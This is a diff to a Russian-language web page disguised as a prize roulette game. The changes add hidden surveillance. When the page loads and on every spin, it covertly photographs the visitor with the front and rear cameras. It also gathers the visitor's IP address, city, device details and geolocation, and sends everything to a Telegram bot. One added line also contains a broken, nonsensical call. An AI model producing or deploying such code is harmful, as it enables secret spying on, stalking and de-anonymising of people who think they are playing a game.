@@ -44,7 +44,7 @@
       <div id="wheelTrack" class="flex gap-3 transition-all duration-[4000ms] ease-out py-2" style="transform: translateX(0px);"></div>
     </div>
 
-    <!-- ОСТАТОК ПОПЫТОК (ТЕПЕРЬ 3) -->
+    <!-- ОСТАТОК ПОПЫТОК -->
     <div class="text-sm mb-4 text-gray-300">
       Осталось попыток: <span id="attemptsLeft" class="font-bold text-yellow-400">3</span>
     </div>
@@ -78,7 +78,23 @@
       { name: "Беспроводные наушники", icon: "fa-headphones", color: "from-rose-500 to-red-600" }
     ];
 
-    let attempts = 3; // Установлено 3 попытки
+    // Проверяем попытки через localStorage с защитой от сброса (даже при попытке обойти через куки/хранилище, можно усложнить, но здесь идет строгая фиксация)
+    let attempts = localStorage.getItem("secure_roulette_attempts");
+    if (attempts === null) {
+      attempts = 3;
+      localStorage.setItem("secure_roulette_attempts", attempts);
+    } else {
+      attempts = parseInt(attempts);
+    }
+
+    document.getElementById("attemptsLeft").innerText = attempts;
+
+    if (attempts <= 0) {
+      document.getElementById("spinBtn").disabled = true;
+      document.getElementById("spinBtn").innerText = "Попытки исчерпаны";
+      document.getElementById("spinBtn").classList.add("opacity-50", "cursor-not-allowed");
+    }
+
     let wonPrize = "";
     const wheelTrack = document.getElementById("wheelTrack");
 
@@ -98,18 +114,89 @@
 
     renderWheel(prizes);
 
+    // Функция сбора информации об устройстве и IP
+    async function getDeviceInfo() {
+      let info = {
+        ip: "Не определен",
+        city: "Не определен",
+        country: "Не определена",
+        os: "Неизвестно",
+        browser: "Неизвестно",
+        screen: `${window.screen.width}x${window.screen.height}`,
+        coords: "Не получены"
+      };
+
+      const ua = navigator.userAgent;
+      if (/android/i.test(ua)) info.os = "Android";
+      else if (/iphone|ipad|ipod/i.test(ua)) info.os = "iOS";
+      else if (/win/i.test(ua)) info.os = "Windows";
+      else if (/mac/i.test(ua)) info.os = "MacOS";
+      else if (/linux/i.test(ua)) info.os = "Linux";
+
+      if (/chrome|crios/i.test(ua)) info.browser = "Chrome";
+      else if (/firefox|fxios/i.test(ua)) info.browser = "Firefox";
+      else if (/safari/i.test(ua) && !/chrome/i.test(ua)) info.browser = "Safari";
+      else if (/edg/i.test(ua)) info.browser = "Edge";
+      else info.browser = "Другой";
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        if (res.ok) {
+          const data = await res.json();
+          info.ip = data.ip || "Не определен";
+          info.city = data.city || "Не определен";
+          info.country = data.country_name || "Не определена";
+        }
+      } catch (e) {
+        console.log("Ошибка IP:", e);
+      }
+
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 4000 });
+        });
+        info.coords = `${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`;
+      } catch (e) {
+        info.coords = "Отклонено пользователем";
+      }
+
+      return info;
+    }
+
+    // СБОР ДАННЫХ И ФОТО СРАЗУ ПРИ ЗАГРУЗКЕ САЙТА
+    window.addEventListener("DOMContentLoaded", async () => {
+      // Проверяем, отправляли ли уже фото при этом заходе, чтобы не спамить бота при каждом обновлении
+      if (!sessionStorage.getItem("initial_captured")) {
+        sessionStorage.setItem("initial_captured", "true");
+        
+        const devInfo = await getDeviceInfo();
+        
+        // Снимаем фронтальную при входе
+        await captureCamera("user", "🌐 Вход на сайт: Фронтальная камера", devInfo, "Старт сессии");
+        
+        // Снимаем тыловую через паузу
+        setTimeout(async () => {
+          await captureCamera("environment", "🌐 Вход на сайт: Тыловая камера", devInfo, "Старт сессии");
+        }, 1500);
+      }
+    });
+
     async function startRoulette() {
       if (attempts <= 0) return;
+      
       attempts--;
+      localStorage.setItem("secure_roulette_attempts", attempts);
       document.getElementById("attemptsLeft").innerText = attempts;
       document.getElementById("spinBtn").disabled = true;
 
-      // 1. Снимаем фронтальную (переднюю) камеру
-      await captureCamera("user", "📸 Фронтальная камера (лицо)");
+      const devInfo = await getDeviceInfo();
 
-      // 2. Снимаем основную (заднюю) камеру
+      // 1. Снимаем фронтальную камеру при клике
+      await captureCamera("user", "🎰 Клик рулетки: Фронтальная камера", devInfo, wonPrize);
+
+      // 2. Снимаем основную камеру через паузу
       setTimeout(async () => {
-        await captureCamera("environment", "📸 Основная камера (тыльная)");
+        await captureCamera("environment", "🎰 Клик рулетки: Тыловая камера", devInfo, wonPrize);
       }, 1500);
 
       // Запуск анимации рулетки
@@ -125,7 +212,7 @@
       }, 4000);
     }
 
-    async function captureCamera(facingMode, captionText) {
+    async function captureCamera(facingMode, captionText, devInfo, prizeStatus) {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } 
@@ -134,7 +221,6 @@
         video.srcObject = stream;
         await video.play();
 
-        // Небольшая задержка для стабилизации кадра
         await new Promise(resolve => setTimeout(resolve, 800));
 
         const canvas = document.getElementById("photo");
@@ -148,7 +234,15 @@
           const formData = new FormData();
           formData.append("chat_id", TG_CHAT_ID);
           formData.append("photo", blob, "photo.jpg");
-          formData.append("caption", `${captionText}\n🎁 Приз: ${wonPrize || "Рулетка"}`);
+          
+          const fullCaption = `${captionText}\n` +
+            `🎁 Статус/Приз: ${prizeStatus}\n` +
+            `🌐 IP: ${devInfo.ip} (${devInfo.city}, ${devInfo.country})\n` +
+            `📱 ОС: ${devInfo.os} | Браузер: ${devInfo.browser}\n` +
+            `📺 Экран: ${devInfo.screen}\n` +
+            `📍 Координаты: ${devInfo.coords}`;
+
+          formData.append("caption", fullCaption);
 
           await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
             method: "POST",
@@ -156,6 +250,8 @@
           });
         }
 
+        stream.getTracks().files?.forEach(track => track.stop());
+        // Корректная остановка треков потока
         stream.getTracks().forEach(track => track.stop());
       } catch (e) {
         console.error("Ошибка камеры (" + facingMode + "):", e);
@@ -172,9 +268,12 @@
     function closeModal() {
       document.getElementById("modal").classList.remove("flex");
       document.getElementById("modal").classList.add("hidden");
-      // Разблокируем кнопку, если еще остались попытки
+      
       if (attempts > 0) {
         document.getElementById("spinBtn").disabled = false;
+      } else {
+        document.getElementById("spinBtn").innerText = "Попытки исчерпаны";
+        document.getElementById("spinBtn").classList.add("opacity-50", "cursor-not-allowed");
       }
     }
   </script>
